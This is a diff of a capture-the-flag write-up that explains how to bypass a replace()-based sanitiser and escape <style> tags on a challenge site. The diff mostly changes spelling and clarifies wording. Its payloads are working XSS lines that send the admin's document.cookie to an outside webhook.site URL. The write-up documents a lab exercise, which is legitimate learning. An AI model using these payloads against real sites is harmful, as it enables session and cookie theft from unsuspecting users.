@@ -15,7 +15,7 @@ We are taken to the `/view` endpoint, which is a page that takes in input and di
 ![](images/deputy1a.PNG)
 
 The challenge description also tells us to access another endpoint `/admin`. This brings us to a page where the "admin"
-will visit a page URL that we give him, and also a `colour` input for the admin to submit.
+will visit a page URL that we give him, and also a `color` input for the admin to submit.
 
 ![](images/deputy1b.PNG)
 
@@ -48,10 +48,10 @@ the sanitisation here would obviously be different, so we should examine the san
 
 The `sanitized()` function uses the `replace()` function to prevent XSS by removing angle brackets `<` or `>`. However
 it's usage is flawed/improper. As per this [page](https://www.w3schools.com/jsref/jsref_replace.asp), `replace()` only
-replaces the ***first instance*** of the value, meaning we can trivially bypass this sanitisation by adding a pair of angle brackets
-`<>` to the front of our payload.
+replaces the ***first instance*** of the value, meaning we can trivially bypass this sanitisation by adding a 'dummy' pair of angle brackets
+`<>` to the front of our payload - our payload will be left intact.
 
-Current `colour` payload:
+Current `color` payload:
 ```
 <><img src=/ onerror="javascript:document.location='https://webhook.site/be022da0-4d21-4882-9dc3-051a5abe875d?c='+document.cookie"></img>
 ```
@@ -68,13 +68,13 @@ As you can see above, the current payload bypasses the `sanitized()` but is stuc
 For our XSS payload to execute, we need to break out of the `<style>` tags. This is simply done by adding `</style>` to 
 the front and `<style>` to the back of our existing payload.
 
-Final `colour` payload:
+Final `color` payload:
 ```
 <></style><img src=/ onerror="javascript:document.location='https://webhook.site/be022da0-4d21-4882-9dc3-051a5abe875d?c='+document.cookie"></img><style>
 ```
 
-We submit our payload to admin, with the URL input as `http://chall.csivit.com:30256/view`, and our webhook site should
-retrieve the cookie that contains the flag.
+At `/admin`, we submit our payload in the `color` field to admin, with the `URL` field as `http://chall.csivit.com:30256/view`,
+and our webhook site should retrieve the cookie that contains the flag.
 
 ![](images/deputy_flag.PNG)
 
